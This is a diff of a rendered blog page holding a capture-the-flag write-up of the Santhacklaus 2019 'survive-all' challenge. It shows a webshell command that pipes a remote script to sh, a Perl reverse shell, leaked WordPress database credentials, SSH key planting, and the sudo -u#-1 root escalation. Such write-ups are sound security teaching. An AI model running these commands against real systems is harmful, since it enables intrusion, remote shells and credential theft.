+</span></span><span style="display:flex;"><span>| /usr/bin/chage |
+</span></span><span style="display:flex;"><span>| /usr/bin/chsh |
+</span></span><span style="display:flex;"><span>| /usr/bin/expiry |
+</span></span><span style="display:flex;"><span>| /usr/bin/chfn |
+</span></span><span style="display:flex;"><span>| /usr/bin/ssh-agent |
+</span></span><span style="display:flex;"><span>| /usr/local/share/fonts |
+</span></span><span style="display:flex;"><span>| /usr/local/bin/sudo |
+</span></span><span style="display:flex;"><span>| /usr/lib/dbus-1.0/dbus-daemon-launch-helper |
+</span></span><span style="display:flex;"><span>| /usr/lib/openssh/ssh-keysign |
+</span></span><span style="display:flex;"><span>| /var/mail |
+</span></span><span style="display:flex;"><span>| /var/local |
+</span></span><span style="display:flex;"><span>| /bin/su |
+</span></span><span style="display:flex;"><span>| /bin/umount |
+</span></span><span style="display:flex;"><span>| /bin/mount |
+</span></span><span style="display:flex;"><span>| /opt/gather_todos_wrapper |
+</span></span><span style="display:flex;"><span>| /sbin/unix_chkpwd |
+</span></span><span style="display:flex;"><span>+---------------------------------------------+
+</span></span></code></pre></div><h2 id="32-bdd-creds">3.2. Bdd creds</h2>
 <p>With the RCE we was able to easily grab MySQL credentials from <code>wp-config.php</code> file.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
-    <span style="color:#75715e">// ** MySQL settings - You can get this info from your web host ** //
-</span><span style="color:#75715e"></span>    <span style="color:#e6db74">/** The name of the database for WordPress */</span>
-    <span style="color:#a6e22e">define</span>( <span style="color:#e6db74">&#39;DB_NAME&#39;</span>, <span style="color:#e6db74">&#39;wordpress&#39;</span>);
-
-    <span style="color:#e6db74">/** MySQL database username */</span>
-    <span style="color:#a6e22e">define</span>( <span style="color:#e6db74">&#39;DB_USER&#39;</span>, <span style="color:#e6db74">&#39;wordpress&#39;</span>);
-
-    <span style="color:#e6db74">/** MySQL database password */</span>
-    <span style="color:#a6e22e">define</span>( <span style="color:#e6db74">&#39;DB_PASSWORD&#39;</span>, <span style="color:#e6db74">&#39;3m1n3m4EVERyoung1nM(y)&lt;3&#39;</span>);
-
-    <span style="color:#e6db74">/** MySQL hostname */</span>
-    <span style="color:#a6e22e">define</span>( <span style="color:#e6db74">&#39;DB_HOST&#39;</span>, <span style="color:#e6db74">&#39;db:3306&#39;</span>);
-
-    <span style="color:#e6db74">/** Database Charset to use in creating database tables. */</span>
-    <span style="color:#a6e22e">define</span>( <span style="color:#e6db74">&#39;DB_CHARSET&#39;</span>, <span style="color:#e6db74">&#39;utf8&#39;</span>);
-
-    <span style="color:#e6db74">/** The Database Collate type. Don&#39;t change this if in doubt. */</span>
-    <span style="color:#a6e22e">define</span>( <span style="color:#e6db74">&#39;DB_COLLATE&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>);
-<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
-</span></code></pre></div><p>Look at this l33t originality :D</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// ** MySQL settings - You can get this info from your web host ** //
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#e6db74">/** The name of the database for WordPress */</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">define</span>( <span style="color:#e6db74">&#39;DB_NAME&#39;</span>, <span style="color:#e6db74">&#39;wordpress&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">/** MySQL database username */</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">define</span>( <span style="color:#e6db74">&#39;DB_USER&#39;</span>, <span style="color:#e6db74">&#39;wordpress&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">/** MySQL database password */</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">define</span>( <span style="color:#e6db74">&#39;DB_PASSWORD&#39;</span>, <span style="color:#e6db74">&#39;3m1n3m4EVERyoung1nM(y)&lt;3&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">/** MySQL hostname */</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">define</span>( <span style="color:#e6db74">&#39;DB_HOST&#39;</span>, <span style="color:#e6db74">&#39;db:3306&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">/** Database Charset to use in creating database tables. */</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">define</span>( <span style="color:#e6db74">&#39;DB_CHARSET&#39;</span>, <span style="color:#e6db74">&#39;utf8&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">/** The Database Collate type. Don&#39;t change this if in doubt. */</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">define</span>( <span style="color:#e6db74">&#39;DB_COLLATE&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>Look at this l33t originality :D</p>
 <h2 id="33-reverse-shell">3.3. Reverse shell</h2>
 <p>With Weevely, we successfully obtained a nice reverse shell. For the exercice, we also checked classics reverse shell payloads but they weren&rsquo;t working. In the end we still managed to get a reverse shell with perl payload.</p>
 <div class="alert protips">
@@ -519,8 +518,8 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 <p>Final paylod : <code>http://survive-all.santhacklaus.xyz/wp-content/uploads/3e5t12e.php?cmd=curl https://shell.now.sh/1.2.3.4:4444 | sh</code></p>
 <p><img src="/img/santhacklaus-2019/screen-16-5.png" alt=""></p>
 <p>If you are curious, here is the original payload :</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">perl -MIO -e <span style="color:#e6db74">&#39;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&#34;1.2.3.4:4444&#34;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;</span>
-</code></pre></div><h1 id="step-4--privilege-escalation">Step 4 : Privilege escalation</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>perl -MIO -e <span style="color:#e6db74">&#39;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&#34;1.2.3.4:4444&#34;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;</span>
+</span></span></code></pre></div><h1 id="step-4--privilege-escalation">Step 4 : Privilege escalation</h1>
 <h2 id="41-informations-gathering">4.1. Informations gathering</h2>
 <p>At this, we were in possesion of a RCE with <code>www-data</code> user. The final objective of the challenge was to obtains root access.</p>
 <div class="alert protips">
@@ -536,42 +535,42 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 <li>All you need to know about linux binaries exploitation : <a href="https://gtfobins.github.io">https://gtfobins.github.io</a></li>
 </ul>
 <p>Here is a one liner to easily past during your penetration test :</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl <span style="color:#e6db74">&#34;https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh&#34;</span> -Lo lse.sh;chmod <span style="color:#ae81ff">700</span> lse.sh; ./lse.sh; curl <span style="color:#e6db74">&#34;https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh&#34;</span> -Lo LinEnum.sh; chmod <span style="color:#ae81ff">700</span> LinEnum.sh; ./LinEnum.sh -r report.txt -e /var/tmp/ -t
-</code></pre></div><p>In our privilege escalation researches, we localised strange binarie with setuid bit : <code>/opt/gather_todos_wrapper</code>.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@081256f7edc3:/ $ find / -user root -perm -4000 -exec ls -ldb <span style="color:#f92672">{}</span> <span style="color:#ae81ff">\;</span>
-
--rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">63736</span> Jul <span style="color:#ae81ff">27</span>  <span style="color:#ae81ff">2018</span> /usr/bin/passwd
--rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">84016</span> Jul <span style="color:#ae81ff">27</span>  <span style="color:#ae81ff">2018</span> /usr/bin/gpasswd
--rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">44440</span> Jul <span style="color:#ae81ff">27</span>  <span style="color:#ae81ff">2018</span> /usr/bin/newgrp
--rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">44528</span> Jul <span style="color:#ae81ff">27</span>  <span style="color:#ae81ff">2018</span> /usr/bin/chsh
--rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">54096</span> Jul <span style="color:#ae81ff">27</span>  <span style="color:#ae81ff">2018</span> /usr/bin/chfn
--rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">568032</span> Dec  <span style="color:#ae81ff">5</span> 09:10 /usr/local/bin/sudo
--rwsr-xr-- <span style="color:#ae81ff">1</span> root messagebus <span style="color:#ae81ff">51184</span> Jun  <span style="color:#ae81ff">9</span>  <span style="color:#ae81ff">2019</span> /usr/lib/dbus-1.0/dbus-daemon-launch-helper
--rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">436552</span> Oct  <span style="color:#ae81ff">6</span> 18:18 /usr/lib/openssh/ssh-keysign
--rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">63568</span> Jan <span style="color:#ae81ff">10</span>  <span style="color:#ae81ff">2019</span> /bin/su
--rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">34888</span> Jan <span style="color:#ae81ff">10</span>  <span style="color:#ae81ff">2019</span> /bin/umount
--rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">51280</span> Jan <span style="color:#ae81ff">10</span>  <span style="color:#ae81ff">2019</span> /bin/mount
--rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">16672</span> Dec  <span style="color:#ae81ff">5</span> 09:11 /opt/gather_todos_wrapper
-</code></pre></div><p><img src="/img/santhacklaus-2019/screen-17.png" alt=""></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl <span style="color:#e6db74">&#34;https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh&#34;</span> -Lo lse.sh;chmod <span style="color:#ae81ff">700</span> lse.sh; ./lse.sh; curl <span style="color:#e6db74">&#34;https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh&#34;</span> -Lo LinEnum.sh; chmod <span style="color:#ae81ff">700</span> LinEnum.sh; ./LinEnum.sh -r report.txt -e /var/tmp/ -t
+</span></span></code></pre></div><p>In our privilege escalation researches, we localised strange binarie with setuid bit : <code>/opt/gather_todos_wrapper</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@081256f7edc3:/ $ find / -user root -perm -4000 -exec ls -ldb <span style="color:#f92672">{}</span> <span style="color:#ae81ff">\;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">63736</span> Jul <span style="color:#ae81ff">27</span>  <span style="color:#ae81ff">2018</span> /usr/bin/passwd
+</span></span><span style="display:flex;"><span>-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">84016</span> Jul <span style="color:#ae81ff">27</span>  <span style="color:#ae81ff">2018</span> /usr/bin/gpasswd
+</span></span><span style="display:flex;"><span>-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">44440</span> Jul <span style="color:#ae81ff">27</span>  <span style="color:#ae81ff">2018</span> /usr/bin/newgrp
+</span></span><span style="display:flex;"><span>-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">44528</span> Jul <span style="color:#ae81ff">27</span>  <span style="color:#ae81ff">2018</span> /usr/bin/chsh
+</span></span><span style="display:flex;"><span>-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">54096</span> Jul <span style="color:#ae81ff">27</span>  <span style="color:#ae81ff">2018</span> /usr/bin/chfn
+</span></span><span style="display:flex;"><span>-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">568032</span> Dec  <span style="color:#ae81ff">5</span> 09:10 /usr/local/bin/sudo
+</span></span><span style="display:flex;"><span>-rwsr-xr-- <span style="color:#ae81ff">1</span> root messagebus <span style="color:#ae81ff">51184</span> Jun  <span style="color:#ae81ff">9</span>  <span style="color:#ae81ff">2019</span> /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+</span></span><span style="display:flex;"><span>-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">436552</span> Oct  <span style="color:#ae81ff">6</span> 18:18 /usr/lib/openssh/ssh-keysign
+</span></span><span style="display:flex;"><span>-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">63568</span> Jan <span style="color:#ae81ff">10</span>  <span style="color:#ae81ff">2019</span> /bin/su
+</span></span><span style="display:flex;"><span>-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">34888</span> Jan <span style="color:#ae81ff">10</span>  <span style="color:#ae81ff">2019</span> /bin/umount
+</span></span><span style="display:flex;"><span>-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">51280</span> Jan <span style="color:#ae81ff">10</span>  <span style="color:#ae81ff">2019</span> /bin/mount
+</span></span><span style="display:flex;"><span>-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">16672</span> Dec  <span style="color:#ae81ff">5</span> 09:11 /opt/gather_todos_wrapper
+</span></span></code></pre></div><p><img src="/img/santhacklaus-2019/screen-17.png" alt=""></p>
 <p>This script permited to guess the account credentials <code>testaccount:testaccount</code></p>
 <h2 id="42-group-privilege-escalation">4.2. Group privilege escalation</h2>
 <p>A classical <code>sudo -l</code> command permited to find sudo privilege of the <code>testaccount</code> user. This account were authorized to execute with <code>staffteam</code> group privilege any command.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@081256f7edc3:/ $ echo testaccount | su - testaccount -c <span style="color:#e6db74">&#34;sudo -l&#34;</span>
-User testaccount may run the following commands on 6a7280b6ec79:
-    <span style="color:#f92672">(</span>BASIC : staffteam<span style="color:#f92672">)</span> NOPASSWD: ALL
-</code></pre></div><p>We opened an other shell with <code>staffteam</code> group privilege.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@081256f7edc3:/ $ echo testaccount | su - testaccount -c <span style="color:#e6db74">&#34;sudo -l&#34;</span>
+</span></span><span style="display:flex;"><span>User testaccount may run the following commands on 6a7280b6ec79:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>BASIC : staffteam<span style="color:#f92672">)</span> NOPASSWD: ALL
+</span></span></code></pre></div><p>We opened an other shell with <code>staffteam</code> group privilege.</p>
 <h2 id="43-ssh-activation">4.3. SSH activation</h2>
 <p>This account with <code>staffteam</code> group privilege have the permission to restart SSH service.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@081256f7edc3:/ $ echo testaccount | su - testaccount -c <span style="color:#e6db74">&#34;echo testaccount | sudo -g staffteam sudo -l&#34;</span>
-User testaccount may run the following commands on 6a7280b6ec79:
-    <span style="color:#f92672">(</span>ALL, !root<span style="color:#f92672">)</span> ALL
-    <span style="color:#f92672">(</span>ALL<span style="color:#f92672">)</span> NOPASSWD: /etc/init.d/apache2 restart, /etc/init.d/ssh restart
-    <span style="color:#f92672">(</span>BASIC : staffteam<span style="color:#f92672">)</span> NOPASSWD: ALL
-</code></pre></div><pre tabindex="0"><code>www-data@081256f7edc3:/ $ echo testaccount | su - testaccount -c &quot;echo testaccount | sudo -g staffteam sudo /etc/init.d/ssh restart&quot;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@081256f7edc3:/ $ echo testaccount | su - testaccount -c <span style="color:#e6db74">&#34;echo testaccount | sudo -g staffteam sudo -l&#34;</span>
+</span></span><span style="display:flex;"><span>User testaccount may run the following commands on 6a7280b6ec79:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>ALL, !root<span style="color:#f92672">)</span> ALL
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>ALL<span style="color:#f92672">)</span> NOPASSWD: /etc/init.d/apache2 restart, /etc/init.d/ssh restart
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>BASIC : staffteam<span style="color:#f92672">)</span> NOPASSWD: ALL
+</span></span></code></pre></div><pre tabindex="0"><code>www-data@081256f7edc3:/ $ echo testaccount | su - testaccount -c &#34;echo testaccount | sudo -g staffteam sudo /etc/init.d/ssh restart&#34;
 </code></pre><p>Done !</p>
 <h2 id="44-ssh-connexion">4.4. SSH connexion</h2>
 <p>We dropped our SSH key in <code>.ssh/authorized_keys</code> and successfully obtained remote SSH connexion.</p>
-<pre tabindex="0"><code>www-data@081256f7edc3:/ $ echo testaccount | su - testaccount -c &quot;id; mkdir -p .ssh; ls -al /home/testaccount; echo 'ssh-rsa AAAAB3NzaC[...]QPAbT th1b4ud@th1b4ud-pc' &gt;&gt; /home/testaccount/.ssh/authorized_keys; ls -al .ssh&quot;
+<pre tabindex="0"><code>www-data@081256f7edc3:/ $ echo testaccount | su - testaccount -c &#34;id; mkdir -p .ssh; ls -al /home/testaccount; echo &#39;ssh-rsa AAAAB3NzaC[...]QPAbT th1b4ud@th1b4ud-pc&#39; &gt;&gt; /home/testaccount/.ssh/authorized_keys; ls -al .ssh&#34;
 
 uid=1000(testaccount) gid=1006(testaccount) groups=1006(testaccount),1005(survive-all)
 total 36
@@ -587,29 +586,29 @@ total 12
 drwx------ 2 testaccount staffteam   4096 Dec 21 23:55 .
 drwxr-xr-x 1 testaccount testaccount 4096 Dec 21 23:39 ..
 -rw-r--r-- 1 testaccount testaccount  400 Dec 21 23:55 authorized_keys
-</code></pre><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>th1b4ud@th1b4ud-pc ~<span style="color:#f92672">]</span>$ ssh testaccount@survive-all.santhacklaus.xyz
-
-Linux 1788f40d5d0e 4.19.0-6-amd64 <span style="color:#75715e">#1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11) x86_64</span>
-
-The programs included with the Debian GNU/Linux system are free software;
-the exact distribution terms <span style="color:#66d9ef">for</span> each program are described in the
-individual files in /usr/share/doc/*/copyright.
-
-Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
-permitted by applicable law.
-testaccount@1788f40d5d0e:~$
-</code></pre></div><p>Nice ! TTY shell access !</p>
+</code></pre><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>th1b4ud@th1b4ud-pc ~<span style="color:#f92672">]</span>$ ssh testaccount@survive-all.santhacklaus.xyz
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Linux 1788f40d5d0e 4.19.0-6-amd64 <span style="color:#75715e">#1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11) x86_64</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>The programs included with the Debian GNU/Linux system are free software;
+</span></span><span style="display:flex;"><span>the exact distribution terms <span style="color:#66d9ef">for</span> each program are described in the
+</span></span><span style="display:flex;"><span>individual files in /usr/share/doc/*/copyright.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+</span></span><span style="display:flex;"><span>permitted by applicable law.
+</span></span><span style="display:flex;"><span>testaccount@1788f40d5d0e:~$
+</span></span></code></pre></div><p>Nice ! TTY shell access !</p>
 <h2 id="45-root-privilege-esacalation">4.5. Root privilege esacalation</h2>
 <p>The privilege <code>(ALL, !root) ALL</code> reffered for an early vulnerability end 2019 : <a href="https://www.exploit-db.com/exploits/47502">https://www.exploit-db.com/exploits/47502</a>. This exploit permited to obtain the final root access on the server.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">testaccount@63f5721427e4:~$ sudo -u#-1 /bin/bash
-Password:
-
-root@63f5721427e4:/home/testaccount# id
-uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>staffteam<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>staffteam<span style="color:#f92672">)</span>
-
-root@63f5721427e4:/home/testaccount# cat /root/flag.txt
-SANTA<span style="color:#f92672">{</span>W3ll_d0ne!!You_HAVE_w0n<span style="color:#f92672">}</span>
-</code></pre></div><p>Tada ! A lovely challenge as usual ! :)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>testaccount@63f5721427e4:~$ sudo -u#-1 /bin/bash
+</span></span><span style="display:flex;"><span>Password:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>root@63f5721427e4:/home/testaccount# id
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>staffteam<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>staffteam<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>root@63f5721427e4:/home/testaccount# cat /root/flag.txt
+</span></span><span style="display:flex;"><span>SANTA<span style="color:#f92672">{</span>W3ll_d0ne!!You_HAVE_w0n<span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>Tada ! A lovely challenge as usual ! :)</p>
 <p>See you next year for the v3.</p>
 <p>Th1b4ud</p>
 
@@ -632,7 +631,7 @@ SANTA<span style="color:#f92672">{</span>W3ll_d0ne!!You_HAVE_w0n<span style="col
 		</ul>
 	</div>
 
-	<p>&copy; 2022. All rights reserved.</p>
+	<p>&copy; 2024. All rights reserved.</p>
 </div>
     </div>
   </div>
